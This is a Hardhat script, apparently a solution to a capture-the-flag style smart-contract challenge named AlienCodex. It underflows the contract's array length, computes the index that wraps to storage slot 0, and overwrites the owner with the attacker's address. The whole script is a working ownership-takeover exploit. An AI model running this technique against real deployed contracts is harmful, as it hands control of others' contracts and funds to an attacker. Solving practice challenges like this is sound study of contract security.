
const hre = require("hardhat");

async function main() {

    const [deployer, signer0, signer1, deployer1] = await hre.ethers.getSigners();

    const contract = await hre.ethers.getContractAt("AlienCodex", "0x4C038ee9f91949FA1a779EF16b9ae0D69287F093", signer0);
    // const contract = await hre.ethers.deployContract("AlienCodex", signer0);
    console.log("Contract deployed to address:", contract.address);
    console.log("Contract owner:", await contract.owner());

    const contract1 = await hre.ethers.getContractAt("AlienCodex", contract.address, deployer);
    console.log("Contract isOwner()", await contract1.isOwner());

    await contract1.makeContact();

    await contract1.retract();

    /* --- Getting array elements from storage --- 

    const arg = hre.ethers.utils.formatBytes32String("mahika");
    console.log("Arg:", arg)
    await contract1.record(arg);
    await contract1.record(arg);

    console.log("First element:", await contract1.codex(0));

    const position = hre.ethers.utils.keccak256(hre.ethers.utils.hexZeroPad(1, 32));
    console.log("Position:", position);

    const position2 = hre.ethers.BigNumber.from(position).add(1).toHexString();
    console.log("Position 2:", position2);

    const elem1 = await hre.ethers.provider.getStorageAt(contract.address, position);
    console.log("Elem 1:", elem1);

    const elem2 = await hre.ethers.provider.getStorageAt(contract.address, position2);
    console.log("Elem 2:", elem2);

    */

    const position = hre.ethers.utils.keccak256(hre.ethers.utils.hexZeroPad(1, 32));
    console.log("Elem 1 Position:", position);
    const slot0 = await hre.ethers.provider.getStorageAt(contract.address, 0);
    console.log("Slot 0:", slot0);
    const slot1 = await hre.ethers.provider.getStorageAt(contract.address, 1);
    console.log("Slot 1:", slot1);
    
    const slotNeeded = hre.ethers.utils.hexlify(hre.ethers.constants.MaxUint256);
    console.log("Slot needed:", slotNeeded);
    const index = hre.ethers.BigNumber.from(slotNeeded).sub(position).add(1);
    console.log("Index:", index);

    console.log("Valid index:", index.lt(hre.ethers.constants.MaxUint256));

    const hackedSlot0 = hre.ethers.utils.hexZeroPad(deployer.address, 32);
    console.log("Hacked slot 0:", hackedSlot0);
    await contract1.revise(index, hackedSlot0);

    console.log("Contract1 owner:", await contract1.owner());
    console.log("Contract1 isOwner()", await contract1.isOwner());

    // const slot0_ = await hre.ethers.provider.getStorageAt(contract.address, 0);
    // console.log("Slot 0:", slot0_);

}


main()
